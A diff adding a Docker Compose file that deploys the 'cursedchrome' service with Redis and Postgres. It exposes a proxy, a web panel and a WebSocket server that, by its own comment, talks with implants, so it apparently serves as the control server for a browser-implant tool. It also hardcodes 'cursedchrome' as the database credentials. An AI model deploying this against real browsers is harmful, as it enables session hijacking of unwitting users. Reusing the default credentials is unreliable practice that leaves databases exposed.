@@ -1,0 +1,32 @@
+version: '3.2'
+services:
+  redis:
+    image: "redis:alpine"
+    command: redis-server --appendonly no
+  db:
+    image: postgres
+    restart: always
+    environment:
+      POSTGRES_PASSWORD: cursedchrome
+      POSTGRES_USER: cursedchrome
+      POSTGRES_DB: cursedchrome
+  cursedchrome:
+    build: .
+    volumes:
+      - ./ssl:/work/cassl
+    depends_on:
+      - db
+      - redis
+    environment:
+      DATABASE_NAME: cursedchrome
+      DATABASE_USER: cursedchrome
+      DATABASE_PASSWORD: cursedchrome
+      DATABASE_HOST: db
+      REDIS_HOST: redis
+      # Number of bcrypt rounds for
+      # storing admin panel passwords.
+      BCRYPT_ROUNDS: 10
+    ports:
+      - "127.0.0.1:8080:8080" # Proxy server
+      - "127.0.0.1:4343:4343" # WebSocket server (talks with implants)
+      - "127.0.0.1:8118:8118" # Web panel
